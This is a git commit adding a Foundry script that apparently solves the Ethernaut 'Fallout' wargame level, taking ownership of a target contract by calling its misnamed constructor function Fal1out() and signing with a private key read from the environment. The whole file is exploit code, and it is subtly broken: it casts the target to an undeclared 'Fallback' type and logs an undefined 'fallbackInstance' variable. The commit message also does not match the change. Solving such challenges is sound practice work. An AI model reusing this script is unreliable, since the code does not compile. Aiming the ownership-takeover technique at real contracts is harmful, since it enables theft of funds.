1066db4859cd873f4283c70d9bbcd852a9cac1b4
aestera <aest3ra@gmail.com>
2025-01-20 13:38:11 +0900

    Commit changes before installing dependencies

---
+++ script/Fallout.s.sol
@@ -0,0 +1,23 @@
+// SPDX-License-Identifier: UNLICENSED
+pragma solidity ^0.6.0;
+
+import "../src/Fallout.sol";
+import "forge-std/Script.sol";
+import "forge-std/console.sol";
+
+contract FalloutSolution is Script {
+
+    address payable target = 0x671268889DB29C3c66F0E112f9d271E643a26259;
+    Fallout fallout = Fallback(target);
+
+    function run() external {
+
+        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
+
+        fallout.Fal1out();
+        console.log("Owner: ", fallbackInstance.owner());
+        console.log("My Address: ", vm.envAddress("MY_ADDRESS"));
+
+        vm.stopBroadcast();
+    }
+}
